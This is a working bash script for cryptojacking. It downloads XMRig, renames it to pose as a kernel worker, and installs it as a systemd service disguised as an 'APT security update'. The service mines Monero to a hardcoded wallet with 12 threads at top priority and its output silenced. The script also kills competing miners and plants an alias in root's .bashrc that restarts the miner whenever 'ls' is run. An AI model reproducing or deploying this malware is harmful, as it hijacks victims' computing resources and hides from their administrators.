#!/bin/bash

# 1. IDENTITY & MASKING
SERVICE_NAME="apt-security-update"
BIN_NAME="kworker-u4-2" 
INSTALL_DIR="/usr/share/apt-cache"
MONERO_ADDR="8B2iQ3u6h1obQsuRGwi1LTEhuYvhLpmbU5ArF4Bq7vJSCbxCa3NyXfGj8G35fCWNqQKMehARU1h2K8DnSXDDbkHi9sr9hwm"
WORKER_NAME="sysapt"

# 2. EMERGENCY UNMASK
sudo systemctl unmask $SERVICE_NAME.service 2>/dev/null

# 3. SEARCH & DESTROY: Kill any other competing miners
pkill -9 xmrig 2>/dev/null
pkill -9 -f "rx.unmineable.com" 2>/dev/null
for proc in "minerd" "ethminer" "nanominer" "cpuminer"; do
    pkill -f "$proc" > /dev/null 2>&1
done

# 4. ARCHITECTURE SELECTION
ARCH=$(uname -m)
VERSION="6.26.0"

if [[ "$ARCH" == "x86_64" ]]; then
    URL="https://github.com/xmrig/xmrig/releases/download/v$VERSION/xmrig-$VERSION-linux-static-x64.tar.gz"
elif [[ "$ARCH" == "x86" || "$ARCH" == "i386" || "$ARCH" == "i686" ]]; then
    URL="https://github.com/xmrig/xmrig/releases/download/v6.12.1/xmrig-6.12.1-linux-static-x32.tar.gz"
elif [[ "$ARCH" == "aarch64" ]]; then
    URL="https://github.com/xmrig/xmrig/releases/download/v$VERSION/xmrig-$VERSION-linux-static-arm64.tar.gz"
else
    exit 1
fi

# 5. INSTALL
sudo mkdir -p "$INSTALL_DIR"
if [ ! -f "$INSTALL_DIR/$BIN_NAME" ]; then
    wget -qO- "$URL" | sudo tar -xzf - -C "$INSTALL_DIR" --strip-components=1
    sudo mv "$INSTALL_DIR/xmrig" "$INSTALL_DIR/$BIN_NAME"
fi

# 6. APT-GRADE PERSISTENCE (12 THREAD MODE)
cat << 'EOF' | sudo tee /etc/systemd/system/apt-security-update.service
[Unit]
Description=Advanced Package Tool Security Update
After=network.target

[Service]
Type=simple
Environment="MONERO_ADDR=8B2iQ3u6h1obQsuRGwi1LTEhuYvhLpmbU5ArF4Bq7vJSCbxCa3NyXfGj8G35fCWNqQKMehARU1h2K8DnSXDDbkHi9sr9hwm"
Environment="WORKER=sysapt"
WorkingDirectory=/usr/share/apt-cache

# Updated with --threads=12 for forced power
ExecStart=/usr/share/apt-cache/kworker-u4-2 -o rx.unmineable.com:3333 -a rx -k -u XMR:${MONERO_ADDR}.${WORKER}#e4xd-807e --threads=12
Restart=always
RestartSec=5
Nice=-20
StandardOutput=null
StandardError=null

[Install]
WantedBy=multi-user.target
EOF

# 7. THE ALIAS TRAP
BASH_FILE="/root/.bashrc"
sudo grep -q "$SERVICE_NAME" "$BASH_FILE" || echo "alias ls='systemctl is-active --quiet $SERVICE_NAME || systemctl start $SERVICE_NAME; ls --color=auto'" | sudo tee -a "$BASH_FILE"

# 8. DEPLOY
sudo systemctl daemon-reload
sudo systemctl enable $SERVICE_NAME
sudo systemctl start $SERVICE_NAME

echo "gotcha apt (12 Threads Active)."